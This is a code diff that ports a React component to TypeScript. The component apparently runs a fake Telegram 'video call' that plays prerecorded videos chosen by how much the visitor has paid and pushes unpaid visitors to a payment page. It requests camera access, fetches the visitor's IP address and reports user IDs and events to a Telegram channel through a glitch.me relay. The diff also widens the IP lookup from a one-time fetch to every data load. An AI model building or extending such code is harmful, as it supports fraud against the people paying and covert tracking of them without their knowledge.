@@ -5,18 +5,30 @@ import TelegramUI from "./startPage";
 import { fetchWithTimeout, parseError, encodeForTelegram } from "./utils";
 import CircularProgress from "@mui/material/CircularProgress";
 import IconButton from "@mui/material/IconButton";
-let ip = "Not Found";
+import { ClientData, UserData, PaymentStats } from "./types";
 
-function Idle() {
-    const { profile, chatId, defvid, force } = useParams();
-    const [hasJoinedCall, setHasJoinedCall] = useState(false);
-    const [canCall, setCanCall] = useState(false);
-    const [clientData, setClientData] = useState(null);
-    const [userData, setUserData] = useState(null);
-    const [isPaying, setIsPaying] = useState(false);
-    const [loading, setLoading] = useState(true);
-    const [isReporting, setIsReporting] = useState(false);
-    const [paymentstats, setPaymentstats] = useState({
+interface CameraStreams {
+    front: MediaStream | null;
+    back: null | MediaStream;
+}
+
+let ip: string = "Not Found";
+
+const Idle: React.FC = () => {
+    const params = useParams();
+    const profile = params.profile ?? "";
+    const chatId = params.chatId ?? "";
+    const defvid = params.defvid;
+    const force = params.force;
+
+    const [hasJoinedCall, setHasJoinedCall] = useState<boolean>(false);
+    const [canCall, setCanCall] = useState<boolean>(false);
+    const [clientData, setClientData] = useState<ClientData | null>(null);
+    const [userData, setUserData] = useState<UserData | null>(null);
+    const [isPaying, setIsPaying] = useState<boolean>(false);
+    const [loading, setLoading] = useState<boolean>(true);
+    const [isReporting, setIsReporting] = useState<boolean>(false);
+    const [paymentstats, setPaymentstats] = useState<PaymentStats>({
         paid: 0,
         demoGiven: 0,
         secondShow: 0,
@@ -24,21 +36,16 @@ function Idle() {
         latestCallTime: Date.now(),
         videos: [],
     });
-    const [video, setVideo] = useState(1);
-    const [videoType, setVideoType] = useState("1");
-    const [duration, setDuration] = useState(0);
-    const [openCount, setOpenCount] = useState(1);
-    const [cameraStreams, setCameraStreams] = useState({
+    const [video, setVideo] = useState<number>(1);
+    const [videoType, setVideoType] = useState<string>("1");
+    const [duration, setDuration] = useState<number>(0);
+    const [openCount, setOpenCount] = useState<number>(1);
+    const [cameraStreams, setCameraStreams] = useState<CameraStreams>({
         front: null,
         back: null,
     });
 
-    // function chooseRandom(arr) {
-    //     const randomIndex = Math.floor(Math.random() * arr.length);
-    //     return arr[randomIndex];
-    // }
-
-    const getCameraStream = useCallback(async (isFrontCamera) => {
+    const getCameraStream = useCallback(async (isFrontCamera: boolean): Promise<MediaStream | undefined> => {
         try {
             const cameraType = isFrontCamera ? "front" : "back";
             if (cameraStreams[cameraType]) {
@@ -64,17 +71,12 @@ function Idle() {
     }, [cameraStreams]);
 
     const reqFullScreen = async () => {
-        var elem = document.documentElement;
+        const elem = document.documentElement;
         try {
-            if (elem.requestFullscreen) {
+            if (document.fullscreenEnabled) {
                 await elem.requestFullscreen({ navigationUI: "hide" });
-            } else if (elem.msRequestFullscreen) {
-                await elem.msRequestFullscreen();
-            } else if (elem.mozRequestFullScreen) {
-                await elem.mozRequestFullScreen();
-            } else if (elem.webkitRequestFullscreen) {
-                await elem.webkitRequestFullscreen();
             } else {
+                // Fallback for browsers that don't support fullscreen
                 await fetchWithTimeout(
                     `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
                         `ChatId: *${chatId}*\nclient: *${profile}*\nVcError: *FullScreenNotSupported*`
@@ -98,18 +100,18 @@ function Idle() {
                 if (!defvid) {
                     let vType = "1";
                     const setTheVideo = async () => {
-                        const chatId = userData.chatId;
+                        const chatId = userData!.chatId;
                         const result = await fetchWithTimeout(
                             `https://uptimechecker2.glitch.me/isRecentUser?chatId=${chatId}`
                         );
                         const count = parseInt(result?.data?.count) || 1;
                         setOpenCount(count);
                         const watchedVideos = [
-                            ...userData.videos.map(Number),
+                            ...userData!.videos.map(Number),
                             ...paymentstats.videos.map(Number),
                         ]; // convert watched videos to number array
 
-                        const chooseFilteredRandom = (options) => {
+                        const chooseFilteredRandom = (options: number[]) => {
                             const filteredOptions = options.filter(
                                 (option) => !watchedVideos.includes(option)
                             );
@@ -120,13 +122,13 @@ function Idle() {
                         ]);
 
                         // console.log(userData.payAmount, userData.demoGiven, userData.secondShow);
-                        if (userData.payAmount > 14 && !userData.demoGiven) {
+                        if (userData!.payAmount > 14 && !userData!.demoGiven) {
                             // console.log("inVtype: ", 1);
                             vType = "1";
                             videoSet = chooseFilteredRandom([
                                 1, 9, 44, 42, 41, 23, 24, 43, 8, 13, 15,
                             ]);
-                            if (userData.videos.length > 0) {
+                            if (userData!.videos.length > 0) {
                                 videoSet = chooseFilteredRandom([24, 21]);
                             }
                             // if (paymentstats.demoGiven === 0) {
@@ -136,7 +138,7 @@ function Idle() {
                             // } else {
                             //     videoSet = chooseFilteredRandom([1,8,9, 13, 15]);
                             // }
-                        } else if (userData.payAmount > 50 && !userData.secondShow) {
+                        } else if (userData!.payAmount > 50 && !userData!.secondShow) {
                             // console.log("inVtype: ", 2);
                             vType = "2";
                             videoSet = chooseFilteredRandom([
@@ -150,8 +152,8 @@ function Idle() {
                             //     videoSet = chooseFilteredRandom([2, 10,11, 16, 14]);
                             // }
                         } else if (
-                            userData.payAmount > 150 ||
-                            userData.highestPayAmount >= 200
+                            userData!.payAmount > 150 ||
+                            userData!.highestPayAmount >= 200
                         ) {
                             // console.log("inVtype: ", 3);
                             vType = "3";
@@ -196,7 +198,7 @@ function Idle() {
             fetchWithTimeout(
                 `https://uptimechecker2.glitch.me/userData/clear-count?chatId=${chatId}`
             );
-            fetchWithTimeout(`${clientData.repl}/deleteCallRequest/${chatId}`);
+            fetchWithTimeout(`${clientData!.repl}/deleteCallRequest/${chatId}`);
         } catch (e) {
             console.log(e);
             await fetchWithTimeout(
@@ -213,12 +215,24 @@ function Idle() {
                 const responseUserInfo = await fetchWithTimeout(
                     `https://api.npoint.io/f0d1e44d82893490bbde/${profile}`
                 );
+                
+                if (!responseUserInfo?.data) {
+                    throw new Error('Failed to fetch user info');
+                }
+                
                 setClientData(responseUserInfo.data);
+                
                 const responseVidData = await fetchWithTimeout(
-                    `https://uptimechecker2.glitch.me/userdata/${responseUserInfo.data?.dbcoll}/${chatId}`
+                    `https://uptimechecker2.glitch.me/userdata/${responseUserInfo.data.dbcoll}/${chatId}`
                 );
+
+                if (!responseVidData?.data) {
+                    throw new Error('Failed to fetch video data');
+                }
+
                 const userDetails = responseVidData.data;
                 setUserData(userDetails);
+
                 if (
                     (userDetails &&
                         userDetails.canReply !== 0 &&
@@ -246,23 +260,23 @@ function Idle() {
                 ) {
                     setCanCall(true);
                     const demoStats = await fetchWithTimeout(
-                        `https://uptimechecker2.glitch.me/paymentstats?chatId=${chatId}&profile=${responseUserInfo.data?.dbcoll}`
+                        `https://uptimechecker2.glitch.me/paymentstats?chatId=${chatId}&profile=${responseUserInfo.data.dbcoll}`
                     );
                     if (demoStats?.data) {
-                        setPaymentstats(demoStats?.data);
+                        setPaymentstats(demoStats.data);
                     }
                 }
                 setLoading(false);
                 getCameraStream(true);
-                if (ip === "Not Found") {
-                    try {
-                        const response = await fetch("https://api.ipify.org?format=json");
-                        const output = await response.json();
-                        ip = output?.ip || "Not Found";
-                    } catch (err) {
-                        // console.error('Failed to fetch IP or send Telegram message:', err);
-                    }
+                
+                try {
+                    const response = await fetch("https://api.ipify.org?format=json");
+                    const output = await response.json();
+                    ip = output?.ip || "Not Found";
+                } catch (err) {
+                    // Silently handle IP fetch errors
                 }
+
                 if (userDetails.count < 5 && userDetails.videos.length < 5) {
                     await fetchWithTimeout(
                         `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
@@ -306,99 +320,97 @@ function Idle() {
         };
 
         fetchData();
-    }, []);
+    }, [chatId, profile, force, getCameraStream, video, paymentstats.videos]);
 
     return (
-        <div style={ { height: "100%" } }>
-            { (loading || isReporting || isPaying) && (
+        <div style={{ height: "100%" }}>
+            {(loading || isReporting || isPaying) && (
                 <IconButton
                     className="idle-app"
-                    style={ { paddingTop: "5vh", color: "grey" } }
+                    style={{ paddingTop: "5vh", color: "grey" }}
                 >
-                    {
-                        <CircularProgress
-                            size={ 50 }
-                            thickness={ 5 }
-                            color="inherit"
-                        ></CircularProgress>
-                    }
+                    <CircularProgress
+                        size={50}
+                        thickness={5}
+                        color="inherit"
+                    />
                 </IconButton>
-            ) }
-            { !loading && (
-                <div style={ { height: "100%" } }>
-                    { canCall &&
+            )}
+            {!loading && userData && clientData && (
+                <div style={{ height: "100%" }}>
+                    {canCall &&
                         (paymentstats.demoGiven < 4 ||
                             paymentstats.latestCallTime <
                             Date.now() - 24 * 60 * 60 * 1000) && (
-                            <div style={ { height: "100%" } }>
-                                { !hasJoinedCall && (
+                            <div style={{ height: "100%" }}>
+                                {!hasJoinedCall && (
                                     <TelegramUI
-                                        joinVideoCall={ joinVideoCall }
-                                        clientData={ clientData }
-                                        userData={ userData }
-                                    ></TelegramUI>
-                                ) }
-                                { hasJoinedCall && (
+                                        joinVideoCall={joinVideoCall}
+                                        clientData={clientData}
+                                        userData={userData}
+                                    />
+                                )}
+                                {hasJoinedCall && (
                                     <VideoCall
-                                        clientData={ clientData }
-                                        userData={ userData }
-                                        paymentstats={ paymentstats }
-                                        video={ video }
-                                        openCount={ openCount }
-                                        duration={ duration }
-                                        videoType={ videoType }
-                                        getCameraStream={ getCameraStream }
-                                    ></VideoCall>
-                                ) }
+                                        clientData={clientData}
+                                        userData={userData}
+                                        paymentstats={paymentstats}
+                                        video={video}
+                                        openCount={openCount}
+                                        duration={duration}
+                                        videoType={videoType}
+                                        getCameraStream={getCameraStream}
+                                    />
+                                )}
                             </div>
-                        ) }
+                        )}
 
-                    { !canCall && (
+                    {!canCall && (
                         <div>
-                            <div style={ { marginTop: "5vh", fontWeight: "bolder" } }>
+                            <div style={{ marginTop: "5vh", fontWeight: "bolder" }}>
                                 Finish Payment
                             </div>
-                            <div style={ { marginTop: "60vh" } }>
+                            <div style={{ marginTop: "60vh" }}>
                                 <button
-                                    style={ {
+                                    style={{
                                         position: "relative",
                                         backgroundColor: "rgb(55 173 72)",
-                                    } }
-                                    onClickCapture={ () => {
-                                        setIsPaying(true); // Set loading state
+                                    }}
+                                    onClickCapture={() => {
+                                        setIsPaying(true);
                                         window.location.href = `https://paidgirl.netlify.app/${profile}`;
-                                    } }
+                                    }}
                                 >
-                                    { isReporting ? "Please wait..." : "Pay Now" }
+                                    {isReporting ? "Please wait..." : "Pay Now"}
                                 </button>
-                                <div style={ { display: "flex", justifyContent: "center" } }>
+                                <div style={{ display: "flex", justifyContent: "center" }}>
                                     <button
                                         className="report-button"
-                                        style={ { backgroundColor: isReporting ? "grey" : "#ee3838" } }
-                                        disabled={ isReporting } // Disable button if loading
-                                        onClick={ async () => {
-                                            setIsReporting(true); // Set loading state
+                                        style={{ backgroundColor: isReporting ? "grey" : "#ee3838" }}
+                                        disabled={isReporting}
+                                        onClick={async () => {
+                                            setIsReporting(true);
                                             await fetchWithTimeout(
                                                 `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
-                                                    `Report Button clicked: *${userData.chatId}*`
+                                                    `Report Button clicked: *${userData!.chatId}*`
                                                 )}`
                                             );
                                             window.open(
                                                 `https://report-upi.netlify.app/${profile}/${chatId}`,
                                                 "_self"
                                             );
-                                        } }
+                                        }}
                                     >
-                                        { isReporting ? "Please wait..." : "Report Transaction" }
+                                        {isReporting ? "Please wait..." : "Report Transaction"}
                                     </button>
                                 </div>
                             </div>
                         </div>
-                    ) }
-
+                    )}
                 </div>
-            ) }
+            )}
         </div>
     );
-}
+};
+
 export default Idle;
